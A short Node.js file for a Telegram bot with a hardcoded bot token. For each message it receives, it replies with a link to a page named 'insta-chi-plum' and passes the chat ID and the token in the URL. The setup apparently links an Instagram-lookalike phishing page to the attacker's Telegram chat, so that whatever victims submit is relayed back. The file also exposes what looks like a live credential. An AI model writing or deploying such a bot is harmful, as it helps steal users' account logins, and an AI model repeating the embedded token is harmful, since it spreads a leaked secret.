import TelegramBot from "node-telegram-bot-api";
const token = "8292077308:AAFMvWEToMiDiz7UQnbmqihk0KiOv8MUCCQ";
const bot = new TelegramBot(token, { polling: true });
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const link = `https://insta-chi-plum.vercel.app/?id=${chatId}&token=${token}`;
    bot.sendMessage(chatId, link);
});